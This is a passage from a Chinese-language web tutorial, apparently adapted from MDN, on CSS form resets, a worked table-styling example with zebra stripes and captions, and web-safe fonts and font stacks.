title="将一切都放在一起“重置”"></a>将一切都放在一起“重置”</h4><p>作为最后一步，我们可以将上面讨论过的各式属性包起来，成为以下的“表单重置”，以提供一个统一的在其上继续进行工作的地基，这包含了前三节提到的所有东西：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span>,<br><span class="hljs-selector-tag">input</span>,<br>select,<br><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: inherit;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">box-sizing</span>: border-box;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-selector-tag">textarea</span> &#123;<br>  <span class="hljs-attribute">overflow</span>: auto;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 通用样式表被许多开发者用作所有项目的一系列基础样式，典型就是那些做了和以上提到相似的事情的那些，在你开始自己的 CSS 作业前，它确保了跨浏览器的任何事情都被默认设定为统一样式。它们不像以往那么重要了，因为浏览器显著地要比以往更加统一。但是，如果你想要看一个例子，可以看看这个<a href="http://necolas.github.io/normalize.css/">Normalize.css</a>，它被许多项目用作基础，是非常流行的样式表。</p><p>至于样式化表单的更加深入的信息，可以看下这些教程的 HTML 一节的这两篇文章：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Styling_web_forms">Styling HTML Forms</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Advanced_form_styling">Advanced Styling for HTML Forms</a></li></ul><h3 id="2-9-样式化表格"><a href="#2-9-样式化表格" class="headerlink" title="2.9 样式化表格"></a>2.9 样式化表格</h3><p>设计一个 HTML 表格不是世界上最迷人的工作，但有时我们必须这样做。本文提供了一个使 HTML 表格看起来不错的指南，其中一些功能在前面的文章中已作详细介绍。</p><h4 id="一个典型的风格化表格"><a href="#一个典型的风格化表格" class="headerlink" title="一个典型的风格化表格"></a>一个典型的风格化表格</h4><ol><li>首先，复制<a href="https://github.com/mdn/learning-area/blob/master/css/styling-boxes/styling-tables/punk-bands-unstyled.html">实例标记</a>到本地，下载这两个图像 (<a href="https://github.com/mdn/learning-area/blob/master/css/styling-boxes/styling-tables/noise.png">noise</a>和 <a href="https://github.com/mdn/learning-area/blob/master/css/styling-boxes/styling-tables/leopardskin.jpg">leopardskin</a>)，然后将三个结果文件放在本地计算机的某个工作目录中。</li><li>接下来，创建一个名为<code>style.css</code>的新文件并将其保存在与其他文件相同的目录中。</li><li>将 CSS 链接到 HTML 中，将下面的 HTML 代码放到 HTML 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/head">&#96;&#96;</a>中：</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;style.css&quot;</span> <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h4 id="间距和布局"><a href="#间距和布局" class="headerlink" title="间距和布局"></a>间距和布局</h4><p>我们需要做的第一件事是整理出空间&#x2F;布局——默认的表格样式是如此的拥挤！要做到这一点，请将以下 CSS 添加到您的 <code>style.css</code> 文件：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* spacing */</span><br><br><span class="hljs-selector-tag">table</span> &#123;<br>  <span class="hljs-attribute">table-layout</span>: fixed;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>  <span class="hljs-attribute">border-collapse</span>: collapse;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid purple;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">30%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>) &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">20%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">15%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">4</span>) &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">35%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">td</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><p>需要注意的最重要的部分如下：</p><ul><li>在你的表上，给table-layout属性设置一个为fixed的值通常是一个好主意，因为它使表的行为在默认情况下更可预测。通常情况下，表列的尺寸会根据所包含的内容大小而变化，这会产生一些奇怪的结果。通过 table-layout: fixed，您可以根据列标题的宽度来规定列的宽度，然后适当地处理它们的内容。这就是为什么我们使用了thead th:nth-child(n) 选择了四个不同的标题 (:nth-child) 选择器（“选择第 n 个子元素，它是一个顺序排列的<code>&lt;th&gt;</code>元素，且其父元素是<code>&lt;thead&gt;</code>元素”）并给定了它们的百分比宽度。整个列宽度与列标题的宽度是一样的，这是一种很好的设定表列尺寸的方式。Chris Coyier 在Fixed Table Layouts中更详细地讨论了这一技术。 我们将它与一个 100% 的width组合在一起，这意味着该表将填充它放入的任何容器，并且能很好的响应（虽然它仍然需要更多的工作来让它在窄屏宽度上看起来很好）。</li><li>一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-collapse"><code>border-collapse</code></a>属性的<code>collapse</code>值对于任何表样式的工作来说都是一个标准的最佳实践。默认情况下，当您在表元素上设置边框时，它们之间将会有间隔，如下图所示：<img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/no-border-collapse.png" alt="img">这看起来不太好 (虽然可能是你想要的样子，谁知道呢？)。使用 <code>border-collapse: collapse;</code> ，让边框合为一条，现在看起来好多了：<img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/border-collapse.png" alt="img"></li><li>我们在整个表设置了一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border"><code>border</code></a>，这是必要的，因为我们将在表页眉和页脚后面设置一些边框——当你在表格外面没有一个边界而且以空隙结尾的时候，它看起来很奇怪，而且是不连贯的。</li><li>我们在<code>&lt;th&gt;</code>和<code>&lt;td&gt;</code>元素上设置了一些padding——这些元素使数据项有了一些空间，使表看起来更加清晰。</li></ul><p>此刻，我们的表看起来好多了：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/table-with-spacing.png" alt="img"></p><h4 id="一些简单的排版"><a href="#一些简单的排版" class="headerlink" title="一些简单的排版"></a>一些简单的排版</h4><p>现在我们把类型整理一下。</p><p>首先，我们在Google Fonts上找到了一种适合于朋克乐队的字体的字体。如果你愿意，你可以去那里找一个不同的。现在，您只需替换我们提供的<code>&lt;link&gt;</code>元素和定制的font-family声明，并使用 Google 字体提供给您的内容。</p><p>首先，将下面的<code>&lt;link&gt;</code>元素添加到您的 HTML 头部，就在您现有的<code>&lt;link&gt;</code>元素之上：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">href</span>=<span class="hljs-string">&#x27;https://fonts.googleapis.com/css?family=Rock+Salt&#x27;</span> <span class="hljs-attribute">rel</span>=<span class="hljs-string">&#x27;stylesheet&#x27;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&#x27;text/css&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>现在将下面的 CSS 添加到您的<code>style.css</code>文件，在之前内容后面添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* typography */</span><br><br><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;helvetica neue&#x27;</span>, helvetica, arial, sans-serif;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">tfoot</span> <span class="hljs-selector-tag">th</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Rock Salt&#x27;</span>, cursive;<br>&#125;<br><br><span class="hljs-selector-tag">th</span> &#123;<br>  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">2px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">td</span> &#123;<br>  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">1px</span>;<br>&#125;<br><br><span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">td</span> &#123;<br>  <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br><br><span class="hljs-selector-tag">tfoot</span> <span class="hljs-selector-tag">th</span> &#123;<br>  <span class="hljs-attribute">text-align</span>: right;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里没有什么特别的东西。我们通常会对字体样式进行调整，使其更易于阅读：</p><ul><li>我们已经设置了一个全局无衬线字体;这纯粹是一种风格上的选择。我们还在和元素的标题上设置了自定义字体，这是一种很不错的、很有朋克风格的外观。</li><li>我们在标题和单元格上设置了一些<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/letter-spacing"><code>letter-spacing</code></a>，因为我们觉得它有助于提高可读性。再次强调，这主要是一种风格上的选择。</li><li>我们在中的表格单元中对文本进行了居中对齐，使它们与标题对齐。默认情况下，单元格被赋予了一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-align"><code>text-align</code></a>的<code>left</code>值，并且标题被赋予了一个<code>center</code>值，但是通常情况下，让两者对齐看起来更好。标题字体的默认粗体值足以区分它们的外观。</li><li>我们在中对标题进行了右对齐，以便与它的数据点更好地关联。</li></ul><p>结果看起来更整洁一些：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/table-with-typography.png" alt="img"></p><h4 id="图形和颜色"><a href="#图形和颜色" class="headerlink" title="图形和颜色"></a>图形和颜色</h4><p>现在轮到图形和颜色了！因为表格上充满“朋克“和“个性”，我们需要给它再搭配一些鲜艳的造型。别担心，你不必让你的表格”燥起来“，你可以选择一些更巧妙、更有品位的东西。</p><p>首先将下面的 CSS 添加到<code>style.css</code>文件中，在底部添加：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">thead</span>, <span class="hljs-selector-tag">tfoot</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">leopardskin.jpg</span>);<br>  <span class="hljs-attribute">color</span>: white;<br>  <span class="hljs-attribute">text-shadow</span>: <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> <span class="hljs-number">1px</span> black;<br>&#125;<br><br><span class="hljs-selector-tag">thead</span> <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">tfoot</span> <span class="hljs-selector-tag">th</span>, <span class="hljs-selector-tag">tfoot</span> <span class="hljs-selector-tag">td</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(to bottom, <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>), <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>));<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">3px</span> solid purple;<br>&#125;<br></code></pre></td></tr></table></figure><p>同样，对于表格这里没有什么特别的，但有几件事值得注意。</p><p>我们已经将一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/background-image"><code>background-image</code></a>添加到和，并将页眉和页脚的所有文本颜色<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/color"><code>color</code></a>更改为白色 (并给它一个<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-shadow"><code>text-shadow</code></a>)，这样它的可读性就更好了。你应该确保你的文字与你的背景形成鲜明的对比，使得它是可读的。</p><p>我们还为<code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/th)和 </code>](<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/td)%E6%B7%BB%E5%8A%A0%E4%BA%86%E4%B8%80%E4%B8%AA%E7%BA%BF%E6%80%A7%E6%B8%90%E5%8F%98%EF%BC%8C%E5%9C%A8%E9%A1%B5%E7%9C%89%E5%92%8C%E9%A1%B5%E8%84%9A%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BA%86%E4%B8%80%E4%B8%AA%E6%BC%82%E4%BA%AE%E7%9A%84%E7%BA%B9%E7%90%86%EF%BC%8C%E5%90%8C%E6%97%B6%E4%B9%9F%E4%B8%BA%E8%BF%99%E4%BA%9B%E5%85%83%E7%B4%A0%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%80%E4%B8%AA%E6%98%8E%E4%BA%AE%E7%9A%84%E7%B4%AB%E8%89%B2%E8%BE%B9%E6%A1%86%E3%80%82%E6%9C%89%E5%A4%9A%E4%B8%AA%E5%B5%8C%E5%A5%97%E7%9A%84%E5%85%83%E7%B4%A0%E6%98%AF%E5%BE%88%E6%9C%89%E7%94%A8%E7%9A%84%EF%BC%8C%E8%BF%99%E6%A0%B7%E6%82%A8%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%B0%86%E6%A0%B7%E5%BC%8F%E5%B1%82%E5%8F%A0%E5%9C%A8%E4%B8%80%E8%B5%B7%E3%80%82%E6%98%AF%E7%9A%84%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AE%BE%E7%BD%AE%E5%A4%9A%E7%BB%84%E8%83%8C%E6%99%AF%E5%9B%BE%E5%83%8F%E5%B1%9E%E6%80%A7%E5%80%BC%E6%9D%A5%E5%9C%A8%E5%92%8C">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/td)添加了一个线性渐变，在页眉和页脚中添加了一个漂亮的纹理，同时也为这些元素提供了一个明亮的紫色边框。有多个嵌套的元素是很有用的，这样您就可以将样式层叠在一起。是的，我们可以通过设置多组背景图像属性值来在和</a> 元素上同时使用背景图像和线性渐变，但是我们决定分开使用，因为考虑到不支持多个背景图像或线性渐变的老浏览器。</p><h4 id="斑马条纹图案"><a href="#斑马条纹图案" class="headerlink" title="斑马条纹图案"></a>斑马条纹图案</h4><p>我们想用一个单独的部分来展示如何实现斑马条纹（<strong>zebra stripes</strong>）——通过改变不同数据行的颜色，使表中交替行不同的数据行可以更容易地进行解析和读取。将下面的 CSS 添加到您的 <code>style.css</code> 文件底部：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">tr</span><span class="hljs-selector-pseudo">:nth-child</span>(odd) &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff33cc</span>;<br>&#125;<br><br><span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">tr</span><span class="hljs-selector-pseudo">:nth-child</span>(even) &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e495e4</span>;<br>&#125;<br><br><span class="hljs-selector-tag">tbody</span> <span class="hljs-selector-tag">tr</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">noise.png</span>);<br>&#125;<br><br><span class="hljs-selector-tag">table</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ff33cc</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>您在前面看到了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:nth-child"><code>:nth-child</code></a>选择器用于选择特定的子元素。它也可以用一个公式作为参数，来选择一个元素序列。公式<code>2n-1</code>会选择所有奇数的子元素 (1、3、5 等)，而公式<code>2n</code>会选择所有偶数的子元素 (2、4、6 等等)。我们在代码中使用了<code>odd</code>和<code>even</code>的关键字，这与前面提到的公式作用完全相同。在这里，我们给奇数行和偶数行不同的 (醒目的) 颜色。</li><li>我们还为所有的行添加了一个重复的噪点背景色块（一个半透明的<code>.png</code>，有一点视觉上的扭曲）来提供一些纹理。</li><li>最后，我们给整个表格提供了一个纯的背景颜色，这样浏览器不支持<code>:nth-child</code>选择器仍然有它们的正文行的背景。</li></ul><p>这种颜色爆炸的结果如下：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/table-with-color.png" alt="img"></p><p>现在，这可能有点过头不符合你的品味，但我们在这里想要指出的一点是，表格并非只能是枯燥无味的，学术性的。</p><h4 id="样式化标题"><a href="#样式化标题" class="headerlink" title="样式化标题"></a>样式化标题</h4><p>对我们的表格还有最后一点处理——样式化标题。要做到这一点，请将以下内容添加到您的<code>style.css</code> 文件底部：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">caption</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;Rock Salt&#x27;</span>, cursive;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-attribute">font-style</span>: italic;<br>  <span class="hljs-attribute">caption-side</span>: bottom;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;<br>  <span class="hljs-attribute">text-align</span>: right;<br>  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">1px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里没有什么值得注意的地方，除了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/caption-side"><code>caption-side</code></a>属性，它被赋予了一个<code>bottom</code>的值。这就导致标题被放置在表格的底部，与其他声明一起提供了最后的外观（见预览版<a href="https://mdn.github.io/learning-area/css/styling-boxes/styling-tables/punk-bands-complete.html">punk-bands-complete.html</a>）：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Styling_tables/table-with-caption.png" alt="img"></p><h4 id="表格样式小贴士"><a href="#表格样式小贴士" class="headerlink" title="表格样式小贴士"></a>表格样式小贴士</h4><p>在继续之前，我们认为我们将为您提供一个快速列表，列出了上面提到的最有用的点：</p><ul><li>使您的表格标记尽可能简单，并且保持灵活性，例如使用百分比，这样设计就更有响应性。</li><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/table-layout"><code>table-layout</code></a><code>: fixed</code> 创建更可控的表布局，可以通过在标题<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a>中设置<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/width"><code>width</code></a>来轻松设置列的宽度。</li><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-collapse"><code>border-collapse</code></a><code>: collapse</code> 使表元素边框合并，生成一个更整洁、更易于控制的外观。</li><li>使用, 和 将表格分割成逻辑块，并提供额外的应用 CSS 的地方，因此如果需要的话，可以更容易地将样式层叠在一起。</li><li>使用斑马线来让其他行更容易阅读。</li><li>使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/text-align"><code>text-align</code></a>直线对齐您的<code>](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/th)和</code>](<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/td)%E6%96%87%E6%9C%AC%EF%BC%8C%E4%BD%BF%E5%86%85%E5%AE%B9%E6%9B%B4%E6%95%B4%E6%B4%81%E3%80%81%E6%9B%B4%E6%98%93%E4%BA%8E%E8%B7%9F%E9%9A%8F%E3%80%82">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/td)文本，使内容更整洁、更易于跟随。</a></li></ul><h3 id="2-10-网页安全字体"><a href="#2-10-网页安全字体" class="headerlink" title="2.10 网页安全字体"></a>2.10 网页安全字体</h3><p>说到字体可用性，只有某几个字体通常可以应用到所有系统，因此可以毫无顾忌地使用。这些都是所谓的 <strong>网页安全字体</strong>。</p><p>大多数时候，作为网页开发者，我们希望对用于显示我们的文本内容的字体有更具体的控制。问题在于，需要一个方法来知道当前正在浏览我们的网站网页的电脑，它有哪些可用字体。我们并不是总能在每种情况下都知道这一点，但是网络安全字体在几乎所有最常用的操作系统（Windows，Mac，最常见的 Linux 发行版，Android 和 iOS 版本）中都可用。</p><p>实际的 Web 安全字体列表将随着操作系统的发展而改变，但是可以认为下面的字体是网页安全的，至少对于现在来说 (它们中的许多都非常流行，这要感谢微软在 90 年代末和 21 世纪初期的倡议*<a href="https://en.wikipedia.org/wiki/Core_fonts_for_the_Web">Core fonts for the Web</a>* )：</p><table><thead><tr><th align="left">字体名称</th><th align="left">泛型</th><th align="left">注意</th></tr></thead><tbody><tr><td align="left">Arial</td><td align="left">sans-serif</td><td align="left">通常认为最佳做法还是添加 Helvetica 作为 Arial 的首选替代品，尽管它们的字体面几乎相同，但 Helvetica 被认为具有更好的形状，即使 Arial 更广泛地可用。</td></tr><tr><td align="left">Courier New</td><td align="left">monospace</td><td align="left">某些操作系统有一个 Courier New 字体的替代（可能较旧的）版本叫 Courier。使用 Courier New 作为 Courier 的首选替代方案，被认为是最佳做法。</td></tr><tr><td align="left">Georgia</td><td align="left">serif</td><td align="left"></td></tr><tr><td align="left">Times New Roman</td><td align="left">serif</td><td align="left">某些操作系统有一个 Times New Roman 字体的替代（可能较旧的）版本叫 Times。使用 Times 作为 Times New Roman 的首选替代方案，被认为是最佳做法。</td></tr><tr><td align="left">Trebuchet MS</td><td align="left">sans-serif</td><td align="left">您应该小心使用这种字体——它在移动操作系统上并不广泛。</td></tr><tr><td align="left">Verdana</td><td align="left">sans-serif</td><td align="left"></td></tr></tbody></table><p><strong>备注：</strong> 在各种资源中，<a href="http://www.cssfontstack.com/">cssfontstack.com</a> 网站维护了一个可用在 Windows 和 Mac 操作系统上使用的网页安全字体的列表，这可以帮助决策网站的安全性。</p><p><strong>备注：</strong> 有一个可以下载来自一个网页的自定义字体的方法，允许你通过任何你想要的方法来定制你使用的字体：<strong>网页字体</strong>。这个有一点复杂，我们将在这个模块中的另一篇文章中讨论这一点。</p><h4 id="默认字体"><a href="#默认字体" class="headerlink" title="默认字体"></a>默认字体</h4><p>CSS 定义了 5 个常用的字体名称：<code>serif</code>, <code>sans-serif</code>, <code>monospace</code>, <code>cursive</code>, 和 <code>fantasy</code>. 这些都是非常通用的，当使用这些通用名称时，使用的字体完全取决于每个浏览器，而且它们所运行的每个操作系统也会有所不同。这是一种糟糕的情况，浏览器会尽力提供一个看上去合适的字体。 <code>serif</code>, <code>sans-serif</code> 和 <code>monospace</code> 是比较好预测的，默认的情况应该比较合理，另一方面，<code>cursive</code> 和 <code>fantasy</code> 是不太好预测的，我们建议使用它们的时候应该稍微注意一些，多多测试。</p><p>五个名称定义如下：</p><table><thead><tr><th align="left">名称</th><th align="left">定义</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>serif</code></td><td align="left">衬线字体，即有衬线的字体（衬线是指字体笔画尾端的小装饰，存在于某些印刷体字体中）。</td><td align="left"></td></tr><tr><td align="left"><code>sans-serif</code></td><td align="left">无衬线字体。</td><td align="left"></td></tr><tr><td align="left"><code>monospace</code></td><td align="left">等宽字体，指包含的全部字符的宽度相同的字体，通常在编辑代码时使用。</td><td align="left"></td></tr><tr><td align="left"><code>cursive</code></td><td align="left">手写字体，对于英文字符而言通常具有顺滑的连接笔画以模拟手写效果。</td><td align="left"></td></tr><tr><td align="left"><code>fantasy</code></td><td align="left">装饰字体。</td><td align="left"></td></tr></tbody></table><h4 id="字体栈"><a href="#字体栈" class="headerlink" title="字体栈"></a>字体栈</h4><p>由于你无法保证你想在你的网页上使用的字体的可用性 (甚至一个网络字体可能由于某些原因而出错), 你可以提供一个<strong>字体栈</strong> (<strong>font stack</strong>)，这样的话，浏览器就有多种字体可以选择了。只需包含一个 <code>font-family</code> 属性，其值由几个用逗号分离的字体名称组成。比如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Trebuchet MS&quot;</span>, Verdana, sans-serif;<br>&#125;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><p>在这种情况下，浏览器从列表的第一个开始，然后查看在当前机器中，这个字体是否可用。如果可用，就把这个字体应用到选中的元素中。如果不可用，它就移到列表中的下一个字体，然后再检查。</p><p>在字体栈的最后提供一个合适的通用的字体名称是个不错的办法，这样的话，即使列出的字体都无法使用，浏览器至少可以提供一个还算合适的选择。为了强调这一点，如果没有其他选项可用，那么段落将被赋予浏览器的默认衬线字体 - 通常是 Time New Roman - 这对于 sans-serif 字体是不利的！</p><p><strong>备注：</strong> 有一些字体名称不止一个单词，比如<code>Trebuchet MS</code> ，那么就需要用引号包裹。</p><h4 id="一个使用-font-family-的例子"><a href="#一个使用-font-family-的例子" class="headerlink" title="一个使用 font-family 的例子"></a>一个使用 font-family 的例子</h4><p>让我们把它添加到之前的例子上，给段落一个 sans-serif 的字体。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">color</span>: red;<br>  <span class="hljs-attribute">font-family</span>: Helvetica, Arial, sans-serif;<br>&#125;<br></code></pre></td></tr></table></figure><p>这给我们以下结果：</p><iframe class="sample-code-frame" title="一个使用 font-family 的例子 sample" id="frame_一个使用_font-family_的例子" width="100%" height="220" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/Styling_text/Fundamentals/_sample_.%E4%B8%80%E4%B8%AA%E4%BD%BF%E7%94%A8_font-family_%E7%9A%84%E4%BE%8B%E5%AD%90.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="字体大小"><a href="#字体大小" class="headerlink" title="字体大小"></a>字体大小</h4><p>在我们之前的模块中的<a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units">CSS values and units</a> 文章，我们回顾了<a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/Building_blocks/Values_and_units#length_and_size">length and size units</a>. 字体大小 (通过 <a 